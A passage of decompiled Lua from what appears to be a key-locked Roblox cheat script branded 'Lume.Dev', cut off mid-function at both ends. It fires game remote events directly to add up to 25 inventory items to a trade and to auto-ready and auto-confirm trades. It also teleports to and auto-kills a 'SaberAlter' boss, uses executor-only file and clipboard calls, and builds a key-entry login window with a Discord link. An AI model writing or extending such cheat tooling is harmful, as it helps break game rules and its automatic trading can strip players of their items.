                    iteratorValue = iteratorValue2
                end
                if hasNext then
                    insert = environment.table.insert
                    items = items2
                    displayName = iteratorValue.displayName
                    if not displayName then
                        displayName = iteratorValue.name
                    end
                    insert(
                        items,
                        (displayName .. (" [" .. ((environment.tostring(iteratorValue.userId)) .. "]")))
                    )
                    continue
                end
                break
            end
            iterationCursor2 = savedIterations[3]
            iterationLimit = savedIterations[2]
            iterationStep = savedIterations[5]
            savedIterations2 = savedIterations[1]
        end
        return items2
    end, closureEnvironment)
end

function functions.handleInvokeServer(closureEnvironment, capturedGetTradablePlayers)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedGetTradablePlayers
        return value.InvokeServer(value)
    end, closureEnvironment)
end

function functions.handleInsert(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callback, items, localPlayer
        items = {}
        localPlayer = environment.game.Players.LocalPlayer
        callback = functions.handleIsAAtLine56(
            environment,
            (localPlayer.FindFirstChild(localPlayer, "PlayerGui")),
            items
        )
        environment.pcall(callback)
        if #items == 0 then
            environment.table.insert(items, "[เปิดกระเป๋าในเกมก่อน]")
        end
        return items
    end, closureEnvironment)
end

function functions.handleIsAAtLine56(closureEnvironment, capturedSharedValue, capturedItems)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, hasNext, inventory, inventory2, ipairsValue, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey
        local iteratorValue, iteratorValue2, iteratorValue3, result, savedIterations, savedIterations2
        inventory =
            capturedSharedValue.InTradingUI.MainFrame.Frame.Content.Player1Side.Player1Holder.PopupHolder.InventoryPopup.Content.Inventory
        ipairsValue = environment.ipairs
        inventory2 = inventory
        callResults = runtime.pack(inventory2.GetChildren(inventory2))
        callResults2 =
            runtime.pack(ipairsValue(runtime.unpack(callResults, 1, (((callResults.n + 3) - 1) - 2))))
        callResults3 = callResults2
        savedIterations = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue2 = nil
        iterationCursor = result
        while true do
            hasNext, iteratorKey, iteratorValue3 = iterationCursor()
            if not hasNext then
            else
                iteratorValue2 = iteratorValue3
            end
            if hasNext then
                iteratorValue = iteratorValue2
                if
                    not (
                        not (iteratorValue.IsA(iteratorValue, "ImageButton"))
                        or (
                            not iteratorValue2.Name
                            or (environment.table.find(capturedItems, iteratorValue2.Name))
                        )
                    )
                then
                    environment.table.insert(capturedItems, iteratorValue2.Name)
                end
                continue
            end
            break
        end
        iterationCursor2 = savedIterations[3]
        iterationLimit = savedIterations[2]
        iterationStep = savedIterations[5]
        savedIterations2 = savedIterations[1]
        return
    end, closureEnvironment)
end

function functions.callbackAtLine76(closureEnvironment, capturedRespondToRequest)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedRespondToRequest
        value.FireServer(value, true)
        return
    end, closureEnvironment)
end

function functions.handleCallback34(closureEnvironment, capturedTradeState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        capturedTradeState.value = argument1
        return
    end, closureEnvironment)
end

function functions.callbackAtLine110(closureEnvironment, capturedConfirmTrade)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedConfirmTrade
        value.FireServer(value)
        return
    end, closureEnvironment)
end

function functions.callbackAtLine3225(closureEnvironment, capturedSetReady)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedSetReady
        value.FireServer(value, true)
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine2(
    closureEnvironment,
    capturedAddToggleResult2,
    capturedNumberValueState2,
    capturedAddItemToTrade,
    capturedAddToggleResult3,
    capturedSetReady
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callback, localPlayer, value
        if capturedAddToggleResult2.Value then
            capturedNumberValueState2.value = true
            environment.task.wait(1.5)
            localPlayer = environment.game.Players.LocalPlayer
            callback = functions.handleGetAttributeAtLine65(
                environment,
                (localPlayer.FindFirstChild(localPlayer, "PlayerGui")),
                capturedAddItemToTrade
            )
            environment.pcall(callback)
            environment.task.wait(0.5)
            capturedNumberValueState2.value = false
        end
        if not ((not capturedAddToggleResult3.Value) or capturedNumberValueState2.value) then
            value = capturedSetReady
            value.FireServer(value, true)
        end
        return
    end, closureEnvironment)
end

function functions.handleGetAttributeAtLine65(closureEnvironment, capturedSharedValue, capturedAddItemToTrade)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, category, hasNext, inventory, inventory2, ipairsValue, iterationCursor, iterationCursor2, iterationLimit, iterationStep
        local iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, iteratorValue5, maxQuantity, name, numberValue, result, savedIterations, savedIterations2
        local value
        inventory =
            capturedSharedValue.InTradingUI.MainFrame.Frame.Content.Player1Side.Player1Holder.PopupHolder.InventoryPopup.Content.Inventory
        numberValue = 0
        ipairsValue = environment.ipairs
        inventory2 = inventory
        callResults = runtime.pack(inventory2.GetChildren(inventory2))
        callResults2 =
            runtime.pack(ipairsValue(runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3))))
        callResults3 = callResults2
        savedIterations = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue = nil
        iterationCursor = result
        while true do
            hasNext, iteratorKey, iteratorValue5 = iterationCursor()
            if not hasNext then
            else
                iteratorValue = iteratorValue5
            end
            if hasNext then
                iteratorValue2 = iteratorValue
                if not (iteratorValue2.IsA(iteratorValue2, "ImageButton")) then
                    continue
                else
                    iteratorValue3 = iteratorValue
                    category = iteratorValue3.GetAttribute(iteratorValue3, "Category")
                    iteratorValue4 = iteratorValue
                    maxQuantity = iteratorValue4.GetAttribute(iteratorValue4, "MaxQuantity")
                    name = iteratorValue.Name
                    if ((not category) or not name) or not maxQuantity then
                        continue
                    else
                        value = capturedAddItemToTrade
                        value.FireServer(value, category, name, maxQuantity)
                        numberValue = (numberValue + 1)
                        environment.task.wait(0.05)
                        if not (25 <= numberValue) then
                            continue
                        end
                    end
                end
            end
            break
        end
        iterationCursor2 = savedIterations[3]
        iterationLimit = savedIterations[2]
        iterationStep = savedIterations[5]
        savedIterations2 = savedIterations[1]
        return
    end, closureEnvironment)
end

function functions.handleFireServer2(
    closureEnvironment,
    capturedAddToggleResult3,
    capturedNumberValueState2,
    capturedSetReady,
    capturedAddToggleResult4,
    capturedConfirmTrade
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, value, value2
        argument12 = argument1
        if (environment["type"](argument12)) == "table" then
            if argument12.phase == "trading" then
                if
                    not (
                        not capturedAddToggleResult3.Value
                        or not ((not capturedNumberValueState2.value) and not argument12.myReady)
                    )
                then
                    environment.task.wait(1)
                    if not ((not capturedAddToggleResult3.Value) or capturedNumberValueState2.value) then
                        value = capturedSetReady
                        value.FireServer(value, true)
                    end
                end
            else
                if
                    (argument12.phase == "confirming")
                    and not ((not capturedAddToggleResult4.Value) or argument12.myConfirm)
                then
                    environment.task.wait(0.8)
                    value2 = capturedConfirmTrade
                    value2.FireServer(value2)
                end
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleFireServer3(closureEnvironment, capturedSharedValueState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedMob = ...
        local gValue, value
        gValue = environment._G
        gValue.SelectedMob = selectedMob
        if capturedSharedValueState.value then
            value = capturedSharedValueState.value
            value.FireServer(value, "repeatable")
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine120(
    closureEnvironment,
    capturedOptions,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(0.1)
            if
                not (
                    not capturedOptions.AutoKillSaberAlter
                    or ((not capturedOptions.AutoKillSaberAlter.Value) or environment._G.IsPortaling)
                )
            then
                environment.pcall(
                    functions.handleFindFirstChildAtLine70(
                        environment,
                        capturedCallback8,
                        capturedCallback13,
                        capturedCallback15,
                        capturedCallback14
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine70(
    closureEnvironment,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, callResults4, enemies, find, find2, findFirstChildResult, findFirstChildResult2, findFirstChildResult3, gValue, hasNext
        local items, items2, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, mobs, nPCs
        local nPCs2, nPCs3, name, name2, result, saberAlterBoss, saberAlterBoss2, saberAlterBoss3, saberAlterBoss4, saberAlterBoss5, saberAlterBoss6, savedIterations
        local savedIterations2, textValue, value, value2, workspaceValue, workspaceValue2, workspaceValue3, workspaceValue4, workspaceValue5, workspaceValue6
        if not environment._G.HasWarpedToSaberAlter then
            value2 = capturedCallback8
            callResults = runtime.pack(
                environment.CFrame.new(
                    651.810181,
                    -3.67419362,
                    -1021.13123,
                    -0.694649816,
                    0,
                    -0.719348073,
                    0,
                    1,
                    0,
                    0.719348073,
                    0,
                    -0.694649816
                )
            )
            value2(runtime.unpack(callResults, 1, (((callResults.n + 2) - 1) - 1)))
            gValue = environment._G
            gValue.HasWarpedToSaberAlter = true
            environment.task.wait(1)
        end
        saberAlterBoss = nil
        workspaceValue6 = environment.workspace
        nPCs3 = workspaceValue6.FindFirstChild(workspaceValue6, "NPCs")
        if nPCs3 then
            nPCs2 = nPCs3
            saberAlterBoss5 = nPCs2.FindFirstChild(nPCs2, "SaberAlterBoss")
            if saberAlterBoss5 then
                saberAlterBoss4 = saberAlterBoss5
                if
                    not (
                        not (saberAlterBoss4.FindFirstChild(saberAlterBoss4, "Humanoid"))
                        or not (0 < saberAlterBoss5.Humanoid.Health)
                    )
                then
                    saberAlterBoss2 = saberAlterBoss5
                    if saberAlterBoss2.FindFirstChild(saberAlterBoss2, "HumanoidRootPart") then
                        find = environment.string.find
                        name = saberAlterBoss5.Name
                        if not (find((name.lower(name)), "dummy")) then
                            saberAlterBoss6 = saberAlterBoss5
                            if (saberAlterBoss6.GetAttribute(saberAlterBoss6, "_NPCReady")) ~= value then
                                saberAlterBoss3 = saberAlterBoss5
                                if (saberAlterBoss3.GetAttribute(saberAlterBoss3, "_NPCReady")) == true then
                                    saberAlterBoss = saberAlterBoss5
                                end
                            else
                                saberAlterBoss = saberAlterBoss5
                            end
                        end
                    end
                end
            end
        end
        if not saberAlterBoss then
            items = runtime.create(4)
            workspaceValue = environment.workspace
            workspaceValue2 = environment.workspace
            enemies = workspaceValue2.FindFirstChild(workspaceValue2, "Enemies")
            workspaceValue3 = environment.workspace
            mobs = workspaceValue3.FindFirstChild(workspaceValue3, "Mobs")
            workspaceValue4 = environment.workspace
            nPCs = workspaceValue4.FindFirstChild(workspaceValue4, "NPCs")
            workspaceValue5 = environment.workspace
            callResults2 = runtime.pack(workspaceValue5.FindFirstChild(workspaceValue5, "Npcs"))
            items2 = items
            runtime.move({ workspaceValue, enemies, mobs, nPCs }, 1, 4, 1, items2)
            runtime.move(callResults2, 1, (((callResults2.n + 8) - 1) - 7), 5, items2)
            textValue = ("SaberAlterBoss_" .. environment._G.SelectedSaberAlterDifficulty)
            callResults3 = runtime.pack(environment.pairs(items))
            callResults4 = callResults3
            savedIterations = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults4[1], callResults4[2], callResults4[3])
            iteratorValue2 = nil
            iterationCursor = result
            while true do
                hasNext, iteratorKey, iteratorValue = iterationCursor()
                if not hasNext then
                else
                    iteratorValue2 = iteratorValue
                end
                if hasNext then
                    if not iteratorValue2 then
                        if not saberAlterBoss then
                            continue
                        end
                    else
                        iteratorValue3 = iteratorValue2
                        findFirstChildResult2 = iteratorValue3.FindFirstChild(iteratorValue3, textValue)
                        if not findFirstChildResult2 then
                            if not saberAlterBoss then
                                continue
                            end
                        else
                            findFirstChildResult = findFirstChildResult2
                            if
                                not (findFirstChildResult.FindFirstChild(findFirstChildResult, "Humanoid"))
                                or not (0 < findFirstChildResult2.Humanoid.Health)
                            then
                                if not saberAlterBoss then
                                    continue
                                end
                            else
                                findFirstChildResult3 = findFirstChildResult2
                                if
                                    not (
                                        findFirstChildResult3.FindFirstChild(
                                            findFirstChildResult3,
                                            "HumanoidRootPart"
                                        )
                                    )
                                then
                                    if not saberAlterBoss then
                                        continue
                                    end
                                else
                                    find2 = environment.string.find
                                    name2 = findFirstChildResult2.Name
                                    if not (find2((name2.lower(name2)), "dummy")) then
                                        saberAlterBoss = findFirstChildResult2
                                    else
                                        if not saberAlterBoss then
                                            continue
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                break
            end
            iterationCursor2 = savedIterations[3]
            iterationLimit = savedIterations[2]
            iterationStep = savedIterations[5]
            savedIterations2 = savedIterations[1]
        end
        if saberAlterBoss then
            capturedCallback8((capturedCallback13(saberAlterBoss.HumanoidRootPart)))
            if environment._G.SelectedWeaponGroup then
                capturedCallback15(environment._G.SelectedWeaponGroup)
            end
            capturedCallback14()
        end
        return
    end, closureEnvironment)
end

function functions.window(
    closureEnvironment,
    capturedCallback,
    capturedItems2,
    capturedCreateResult,
    capturedSetclipboardValue,
    capturedItems3,
    capturedCallback2,
    capturedCallback3
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2 = ...
        local addGradient, addStrokeResult, anchorPoint, argument22, backgroundColor3, backgroundColor32, backgroundColor33, callResults, callResults2, callResults3, callback, create
        local create10, create11, create12, create13, create2, create3, create4, create5, create6, create7, create8, create9
        local createResult, createResult2, createResult3, createResult4, createResult5, createResult6, createResult7, discord, displayName, file, fillDirection, font
        local font2, font3, font4, font5, font6, instanceObject, items, items10, items11, items12, items13, items14
        local items15, items2, items3, items4, items5, items6, items7, items8, items9, mouseButton1Click, new, new2
        local newResult, padding, parent, parent2, parent3, parent4, parent5, placeholderColor3, position, position10, position11, position2
        local position3, position4, position5, position6, position7, position8, position9, readfileResult, size, size10, size11, size12
        local size13, size2, size3, size4, size5, size6, size7, size8, size9, text, textColor3, textColor32
        local textColor33, textColor34, textColor35, textColor36, textXAlignment, textXAlignment2, textXAlignment3, textXAlignment4, value, value10, value11, value12
        local value13, value14, value15, value16, value17, value18, value19, value2, value3, value4, value5, value6
        local value7, value8, value9
        argument22 = argument2
        displayName = argument22.DisplayName
        if not displayName then
            displayName = "Lume.Dev"
        end
        argument22.DisplayName = displayName
        file = argument22.File
        if not file then
            file = "Lumedev/savedkey.txt"
        end
        argument22.File = file
        discord = argument22.Discord
        if not discord then
            discord = "https://discord.gg/Zk7f9w4DcD"
        end
        argument22.Discord = discord
        if not (environment.isfile(argument22.File)) then
            value8 = capturedItems2
            create6 = value8.Create
            items6 = {}
            items6.Name = "MainFrame"
            items6.Parent = capturedCreateResult
            anchorPoint = environment.Vector2.new(0.5, 0.5)
            items6.AnchorPoint = anchorPoint
            position6 = environment.UDim2.new(0.5, 0, 0.5, 0)
            items6.Position = position6
            size6 = environment.UDim2.fromOffset(500, 280)
            items6.Size = size6
            backgroundColor32 = environment.Color3.fromRGB(18, 18, 20)
            items6.BackgroundColor3 = backgroundColor32
            items6.BorderSizePixel = 0
            parent3 = create6(value8, "Frame", items6)
            value9 = capturedItems2
            value9.AddCorner(value9, parent3, 16)
            value10 = capturedItems2
            value10.AddStroke(value10, parent3, (environment.Color3.fromRGB(45, 45, 50)), 1)
            value11 = capturedItems2
            value11.AddShadow(value11, parent3)
            value12 = capturedItems2
            create7 = value12.Create
            items7 = {}
            items7.Parent = parent3
            size7 = environment.UDim2.new(1, 0, 0, 50)
            items7.Size = size7
            items7.BackgroundTransparency = 1
            parent4 = create7(value12, "Frame", items7)
            value13 = capturedItems2
            create8 = value13.Create
            items8 = {}
            items8.Parent = parent4
            size8 = environment.UDim2.new(1, -60, 1, 0)
            items8.Size = size8
            position7 = environment.UDim2.new(0, 24, 0, 0)
            items8.Position = position7
            items8.BackgroundTransparency = 1
            text = argument22.DisplayName
            items8.Text = text
            textColor34 = environment.Color3.fromRGB(255, 255, 255)
            items8.TextColor3 = textColor34
            font4 = environment.Enum.Font.GothamBold
            items8.Font = font4
            items8.TextSize = 18
            textXAlignment3 = environment.Enum.TextXAlignment.Left
            items8.TextXAlignment = textXAlignment3
            createResult5 = create8(value13, "TextLabel", items8)
            value14 = capturedItems2
            addGradient = value14.AddGradient
            items9 = runtime.create(1)
            new = environment.ColorSequenceKeypoint.new
            callResults = runtime.pack(environment.Color3.fromRGB(255, 80, 80))
            newResult = new(0, runtime.unpack(callResults, 1, (((callResults.n + 12) - 1) - 11)))
            new2 = environment.ColorSequenceKeypoint.new
            callResults2 = runtime.pack(environment.Color3.fromRGB(150, 20, 20))
            callResults3 =
                runtime.pack(new2(1, runtime.unpack(callResults2, 1, (((callResults2.n + 13) - 1) - 12))))
            items10 = items9
            runtime.move({ newResult }, 1, 1, 1, items10)
            runtime.move(callResults3, 1, (((callResults3.n + 11) - 1) - 10), 2, items10)
            addGradient(value14, createResult5, items9)
            value15 = capturedItems2
            create9 = value15.Create
            items11 = {}
            items11.Parent = parent4
            size9 = environment.UDim2.new(0, 30, 0, 30)
            items11.Size = size9
            position8 = environment.UDim2.new(1, -40, 0.5, -15)
            items11.Position = position8
            items11.BackgroundTransparency = 1
            items11.Text = "×"
            textColor35 = environment.Color3.fromRGB(120, 120, 130)
            items11.TextColor3 = textColor35
            font5 = environment.Enum.Font.Gotham
            items11.Font = font5
            items11.TextSize = 28
            mouseButton1Click = (create9(value15, "TextButton", items11)).MouseButton1Click
            mouseButton1Click.Connect(
                mouseButton1Click,
                functions.handleDestroy(environment, capturedCreateResult)
            )
            value16 = capturedItems2
            create10 = value16.Create
            items12 = {}
            items12.Parent = parent4
            size10 = environment.UDim2.new(1, 0, 0, 1)
            items12.Size = size10
            position9 = environment.UDim2.new(0, 0, 1, 0)
            items12.Position = position9
            backgroundColor33 = environment.Color3.fromRGB(35, 35, 40)
            items12.BackgroundColor3 = backgroundColor33
            items12.BorderSizePixel = 0
            createResult6 = create10(value16, "Frame", items12)
            value17 = capturedItems2
            create11 = value17.Create
            items13 = {}
            items13.Parent = parent3
            size11 = environment.UDim2.new(1, -48, 1, -80)
            items13.Size = size11
            position10 = environment.UDim2.new(0, 24, 0, 70)
            items13.Position = position10
            items13.BackgroundTransparency = 1
            parent5 = create11(value17, "Frame", items13)
            value18 = capturedItems2
            create12 = value18.Create
            items14 = {}
            items14.Parent = parent5
            size12 = environment.UDim2.new(1, 0, 0, 20)
            items14.Size = size12
            position11 = environment.UDim2.new(0, 0, 0, -5)
            items14.Position = position11
            items14.BackgroundTransparency = 1
            items14.Text = "Please enter your access key below to continue."
            textColor36 = environment.Color3.fromRGB(100, 100, 110)
            items14.TextColor3 = textColor36
            font6 = environment.Enum.Font.Gotham
            items14.Font = font6
            items14.TextSize = 12
            textXAlignment4 = environment.Enum.TextXAlignment.Left
            items14.TextXAlignment = textXAlignment4
            createResult7 = create12(value18, "TextLabel", items14)
            value19 = capturedItems2
            create13 = value19.Create
            items15 = {}
            items15.Parent = parent5
            size13 = environment.UDim2.new(1, 0, 0, 50)
            items15.Size = size13
            position = environment.UDim2.new(0, 0, 0, 25)
            items15.Position = position
            backgroundColor3 = environment.Color3.fromRGB(12, 12, 14)
            items15.BackgroundColor3 = backgroundColor3
            parent = create13(value19, "Frame", items15)
            value = capturedItems2
            value.AddCorner(value, parent, 10)
            value2 = capturedItems2
            addStrokeResult = value2.AddStroke(value2, parent, (environment.Color3.fromRGB(40, 40, 45)), 1)
            value3 = capturedItems2
            create = value3.Create
            items = {}
            items.Parent = parent
            size = environment.UDim2.new(1, -30, 1, 0)
            items.Size = size
            position2 = environment.UDim2.new(0, 15, 0, 0)
            items.Position = position2
            items.BackgroundTransparency = 1
            items.Text = ""
            items.PlaceholderText = "Paste your key here..."
            placeholderColor3 = environment.Color3.fromRGB(70, 70, 80)
            items.PlaceholderColor3 = placeholderColor3
            textColor3 = environment.Color3.fromRGB(220, 220, 220)
            items.TextColor3 = textColor3
            font = environment.Enum.Font.GothamMedium
            items.Font = font
            items.TextSize = 14
            items.ClearTextOnFocus = false
            createResult = create(value3, "TextBox", items)
            value4 = capturedItems2
            create2 = value4.Create
            items2 = {}
            items2.Parent = parent5
            size2 = environment.UDim2.new(1, 0, 0, 45)
            items2.Size = size2
            position3 = environment.UDim2.new(0, 0, 0, 95)
            items2.Position = position3
            items2.BackgroundTransparency = 1
            createResult2 = create2(value4, "Frame", items2)
            instanceObject = environment.Instance.new("UIListLayout", createResult2)
            fillDirection = environment.Enum.FillDirection.Horizontal
            instanceObject.FillDirection = fillDirection
            padding = environment.UDim.new(0, 12)
            instanceObject.Padding = padding
            callback = functions.handleFromRGB(environment, capturedItems2, createResult2)
            callback(
                "GET KEY",
                (environment.Color3.fromRGB(46, 204, 113)),
                functions.handleGetKeyURL(
                    environment,
                    capturedSetclipboardValue,
                    capturedItems3,
                    capturedCallback2
                )
            )
            callback(
                "DISCORD",
                (environment.Color3.fromRGB(88, 101, 242)),
                functions.handleCallbackAtLine73(
                    environment,
                    capturedSetclipboardValue,
                    argument22,
                    capturedCallback2
                )
            )
            callback(
                "LOGIN",
                (environment.Color3.fromRGB(192, 57, 43)),
                functions.handleCallbackAtLine40(environment, capturedCallback, createResult, argument22)
            )
            value5 = capturedItems2
            create3 = value5.Create
            items3 = {}
            items3.Parent = parent3
            size3 = environment.UDim2.new(1, -48, 0, 20)
            items3.Size = size3
            position4 = environment.UDim2.new(0, 24, 1, -30)
            items3.Position = position4
            items3.BackgroundTransparency = 1
            parent2 = create3(value5, "Frame", items3)
            value6 = capturedItems2
            create4 = value6.Create
            items4 = {}
            items4.Parent = parent2
            size4 = environment.UDim2.new(0.5, 0, 1, 0)
            items4.Size = size4
            items4.BackgroundTransparency = 1
            items4.Text = "Secured by PandaAuth New API"
            textColor32 = environment.Color3.fromRGB(70, 70, 80)
            items4.TextColor3 = textColor32
            font2 = environment.Enum.Font.GothamBold
            items4.Font = font2
            items4.TextSize = 10
            textXAlignment = environment.Enum.TextXAlignment.Left
            items4.TextXAlignment = textXAlignment
            createResult3 = create4(value6, "TextLabel", items4)
            value7 = capturedItems2
            create5 = value7.Create
            items5 = {}
            items5.Parent = parent2
            size5 = environment.UDim2.new(0.5, 0, 1, 0)
            items5.Size = size5
            position5 = environment.UDim2.new(0.5, 0, 0, 0)
            items5.Position = position5
            items5.BackgroundTransparency = 1
            items5.Text = "v1.1.0"
            textColor33 = environment.Color3.fromRGB(50, 50, 60)
            items5.TextColor3 = textColor33
            font3 = environment.Enum.Font.GothamBold
            items5.Font = font3
            items5.TextSize = 10
            textXAlignment2 = environment.Enum.TextXAlignment.Right
            items5.TextXAlignment = textXAlignment2
            createResult4 = create5(value7, "TextLabel", items5)
            capturedCallback3(parent3)
            return
        else
            readfileResult = environment.readfile(argument22.File)
            if
                not readfileResult
                or ((readfileResult == "") or not (capturedCallback(readfileResult, argument22.File)))
            then
                value8 = capturedItems2
                create6 = value8.Create
                items6 = {}
                items6.Name = "MainFrame"
                items6.Parent = capturedCreateResult
                anchorPoint = environment.Vector2.new(0.5, 0.5)
                items6.AnchorPoint = anchorPoint
                position6 = environment.UDim2.new(0.5, 0, 0.5, 0)
                items6.Position = position6
                size6 = environment.UDim2.fromOffset(500, 280)
                items6.Size = size6
                backgroundColor32 = environment.Color3.fromRGB(18, 18, 20)
                items6.BackgroundColor3 = backgroundColor32
                items6.BorderSizePixel = 0
                parent3 = create6(value8, "Frame", items6)
                value9 = capturedItems2
                value9.AddCorner(value9, parent3, 16)
                value10 = capturedItems2
                value10.AddStroke(value10, parent3, (environment.Color3.fromRGB(45, 45, 50)), 1)
                value11 = capturedItems2
                value11.AddShadow(value11, parent3)
                value12 = capturedItems2
                create7 = value12.Create
                items7 = {}
                items7.Parent = parent3
                size7 = environment.UDim2.new(1, 0, 0, 50)
                items7.Size = size7
                items7.BackgroundTransparency = 1
                parent4 = create7(value12, "Frame", items7)
                value13 = capturedItems2
                create8 = value13.Create
                items8 = {}
                items8.Parent = parent4
                size8 = environment.UDim2.new(1, -60, 1, 0)
                items8.Size = size8
                position7 = environment.UDim2.new(0, 24, 0, 0)
                items8.Position = position7
                items8.BackgroundTransparency = 1
                text = argument22.DisplayName
                items8.Text = text
                textColor34 = environment.Color3.fromRGB(255, 255, 255)
                items8.TextColor3 = textColor34
                font4 = environment.Enum.Font.GothamBold
                items8.Font = font4
                items8.TextSize = 18
                textXAlignment3 = environment.Enum.TextXAlignment.Left
                items8.TextXAlignment = textXAlignment3
                createResult5 = create8(value13, "TextLabel", items8)
                value14 = capturedItems2
                addGradient = value14.AddGradient
                items9 = runtime.create(1)
                new = environment.ColorSequenceKeypoint.new
                callResults = runtime.pack(environment.Color3.fromRGB(255, 80, 80))
                newResult = new(0, runtime.unpack(callResults, 1, (((callResults.n + 12) - 1) - 11)))
                new2 = environment.ColorSequenceKeypoint.new
                callResults2 = runtime.pack(environment.Color3.fromRGB(150, 20, 20))
                callResults3 =
                    runtime.pack(new2(1, runtime.unpack(callResults2, 1, (((callResults2.n + 13) - 1) - 12))))
                items10 = items9
                runtime.move({ newResult }, 1, 1, 1, items10)
                runtime.move(callResults3, 1, (((callResults3.n + 11) - 1) - 10), 2, items10)
                addGradient(value14, createResult5, items9)
                value15 = capturedItems2
                create9 = value15.Create
                items11 = {}
                items11.Parent = parent4
                size9 = environment.UDim2.new(0, 30, 0, 30)
                items11.Size = size9
                position8 = environment.UDim2.new(1, -40, 0.5, -15)
                items11.Position = position8
                items11.BackgroundTransparency = 1
                items11.Text = "×"
                textColor35 = environment.Color3.fromRGB(120, 120, 130)
                items11.TextColor3 = textColor35
                font5 = environment.Enum.Font.Gotham
                items11.Font = font5
                items11.TextSize = 28
                mouseButton1Click = (create9(value15, "TextButton", items11)).MouseButton1Click
                mouseButton1Click.Connect(
                    mouseButton1Click,
                    functions.handleDestroy(environment, capturedCreateResult)
                )
                value16 = capturedItems2
                create10 = value16.Create
                items12 = {}
                items12.Parent = parent4
                size10 = environment.UDim2.new(1, 0, 0, 1)
                items12.Size = size10
                position9 = environment.UDim2.new(0, 0, 1, 0)
                items12.Position = position9
                backgroundColor33 = environment.Color3.fromRGB(35, 35, 40)
                items12.BackgroundColor3 = backgroundColor33
                items12.BorderSizePixel = 0
                createResult6 = create10(value16, "Frame", items12)
                value17 = capturedItems2
                create11 = value17.Create
                items13 = {}
                items13.Parent = parent3
                size11 = environment.UDim2.new(1, -48, 1, -80)
                items13.Size = size11
                position10 = environment.UDim2.new(0, 24, 0, 70)
                items13.Position = position10
                items13.BackgroundTransparency = 1
                parent5 = create11(value17, "Frame", items13)
                value18 = capturedItems2
                create12 = value18.Create
                items14 = {}
                items14.Parent = parent5
                size12 = environment.UDim2.new(1, 0, 0, 20)
                items14.Size = size12
                position11 = environment.UDim2.new(0, 0, 0, -5)
                items14.Position = position11
                items14.BackgroundTransparency = 1
                items14.Text = "Please enter your access key below to continue."
                textColor36 = environment.Color3.fromRGB(100, 100, 110)
                items14.TextColor3 = textColor36
                font6 = environment.Enum.Font.Gotham
                items14.Font = font6
                items14.TextSize = 12
                textXAlignment4 = environment.Enum.TextXAlignment.Left
                items14.TextXAlignment = textXAlignment4
                createResult7 = create12(value18, "TextLabel", items14)
                value19 = capturedItems2
                create13 = value19.Create
                items15 = {}
                items15.Parent = parent5
                size13 = environment.UDim2.new(1, 0, 0, 50)
                items15.Size = size13
                position = environment.UDim2.new(0, 0, 0, 25)
                items15.Position = position
                backgroundColor3 = environment.Color3.fromRGB(12, 12, 14)
                items15.BackgroundColor3 = backgroundColor3
                parent = create13(value19, "Frame", items15)
                value = capturedItems2
                value.AddCorner(value, parent, 10)
                value2 = capturedItems2
                addStrokeResult =
                    value2.AddStroke(value2, parent, (environment.Color3.fromRGB(40, 40, 45)), 1)
                value3 = capturedItems2
                create = value3.Create
                items = {}
                items.Parent = parent
                size = environment.UDim2.new(1, -30, 1, 0)
                items.Size = size
                position2 = environment.UDim2.new(0, 15, 0, 0)
                items.Position = position2
                items.BackgroundTransparency = 1
                items.Text = ""
                items.PlaceholderText = "Paste your key here..."
                placeholderColor3 = environment.Color3.fromRGB(70, 70, 80)
                items.PlaceholderColor3 = placeholderColor3
                textColor3 = environment.Color3.fromRGB(220, 220, 220)
                items.TextColor3 = textColor3
                font = environment.Enum.Font.GothamMedium
                items.Font = font
                items.TextSize = 14
                items.ClearTextOnFocus = false
                createResult = create(value3, "TextBox", items)
                value4 = capturedItems2
                create2 = value4.Create
                items2 = {}
                items2.Parent = parent5
                size2 = environment.UDim2.new(1, 0, 0, 45)
                items2.Size = size2
                position3 = environment.UDim2.new(0, 0, 0, 95)
                items2.Position = position3
                items2.BackgroundTransparency = 1
                createResult2 = create2(value4, "Frame", items2)
                instanceObject = environment.Instance.new("UIListLayout", createResult2)
                fillDirection = environment.Enum.FillDirection.Horizontal
                instanceObject.FillDirection = fillDirection
                padding = environment.UDim.new(0, 12)
                instanceObject.Padding = padding
                callback = functions.handleFromRGB(environment, capturedItems2, createResult2)
                callback(
                    "GET KEY",
                    (environment.Color3.fromRGB(46, 204, 113)),
                    functions.handleGetKeyURL(
                        environment,
